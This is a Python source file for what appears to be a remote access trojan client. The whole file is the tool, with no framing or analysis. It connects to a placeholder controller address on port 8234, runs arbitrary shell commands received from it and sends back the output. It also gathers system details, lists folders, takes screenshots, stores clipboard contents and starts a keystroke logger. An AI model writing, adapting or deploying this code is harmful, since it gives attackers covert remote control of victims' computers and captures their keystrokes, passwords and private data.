import socket
import subprocess
import os
import platform
import time
import pyautogui
import clipboard
import keyboard

# Replace these placeholders with actual values during activation
UID = '<UID>'
SERVER_IP = '<SERVER_IP>'

def encrypt_message(message):
    return message.encode()

def decrypt_message(encrypted_message):
    return encrypted_message.decode()

def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, 8234))
            encrypted_data = encrypt_message(data)
            client_socket.sendall(encrypted_data)
    except Exception as e:
        print(f"Error sending data: {e}")

def receive_data():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, 8234))
            encrypted_data = client_socket.recv(4096)
            decrypted_data = decrypt_message(encrypted_data)
            return decrypted_data
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def get_system_info():
    system_info = f"System: {platform.system()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Release: {platform.release()}\n"
    system_info += f"Version: {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    return system_info

def list_folders(directory='.'):
    folders = []
    for folder in os.listdir(directory):
        if os.path.isdir(os.path.join(directory, folder)):
            folders.append(os.path.join(directory, folder))
    return folders

def take_screenshot():
    screenshot_path = f'screenshot_{int(time.time())}.png'
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

def save_clipboard_data():
    clipboard_data = clipboard.paste()
    with open('clipboard_data.txt', 'a') as clipboard_file:
        clipboard_file.write(f"{clipboard_data}\n")

def log_key_strokes():
    def on_key_event(e):
        if e.event_type == keyboard.KEY_DOWN:
            with open('key_log.txt', 'a') as key_log_file:
                key_log_file.write(f"{e.name}\n")

    keyboard.hook(on_key_event)

def main():
    while True:
        command = receive_data()
        if command:
            if command.startswith("exit"):
                break
            elif command.startswith("cd"):
                os.chdir(command[3:].strip())
                send_data(f"Changed directory to {os.getcwd()}")
            elif command.startswith("get_sys_info"):
                system_info = get_system_info()
                send_data(system_info)
            elif command.startswith("list_folders"):
                folders_info = list_folders()
                send_data(f"List of folders:\n{', '.join(folders_info)}")
            elif command.startswith("take_screenshot"):
                screenshot_path = take_screenshot()
                send_data(f"Screenshot saved at: {screenshot_path}")
            elif command.startswith("save_clipboard_data"):
                save_clipboard_data()
                send_data("Clipboard data saved.")
            elif command.startswith("log_key_strokes"):
                log_key_strokes()
                send_data("Key strokes logging started.")
            else:
                result = execute_command(command)
                send_data(result)
        time.sleep(1)

if __name__ == "__main__":
    main()